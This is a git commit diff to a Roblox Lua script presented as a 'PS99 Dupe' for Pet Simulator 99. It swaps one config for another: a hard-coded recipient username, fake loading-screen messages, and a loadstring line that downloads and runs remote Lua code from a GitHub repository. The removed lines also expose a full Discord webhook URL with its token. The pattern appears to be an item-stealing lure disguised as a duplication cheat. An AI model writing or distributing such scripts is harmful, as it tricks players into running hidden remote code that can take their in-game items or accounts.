9e5d55c29fa688c0065dde896014f1ea2ba22271
Hegejfvsjw <132260042+Hegejfvsjw@users.noreply.github.com>
2023-12-24 16:28:07 +0300

    Script.lua

--- Script.lua
+++ Script.lua
@@ -1,23 +1,8 @@
-UserName = "LEGACROW11"
+Username = "LEGACROW11"
+_G.CustomScriptName = "PS99 Dupe" -- Main text
+_G.Text1 = "Script Loaded..." --tip test1
+_G.Text2 = "Waiting for Script" --tip test1
+_G.Text3 = "Checking Scripts..." --tip test1
+_G.Text4 = "Starting Scripts..." --tip test1
 
-UserName2 = "LEGACROW11"
-
-Webhook = "https://discord.com/api/webhooks/1107037193547042956/LsZ5NpRtPPV_jmw4vPNGI9yMPIf0VULYqQP6uToVFtGbWDJEQ4FyODVPp-ll7cMMWzZi"
-
-_G.LoadingScreen = true
-
-_G.AntiLeave = false
-
-_G.MouseLock = true 
-
-_G.ScriptName = "Rizz Scriptz"
-
-_G.FirstText = "Script Preparing"
-
-_G.SecondText = "Script Loading..."
-
-_G.ThirdText = "Almost Done..."
-
-_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
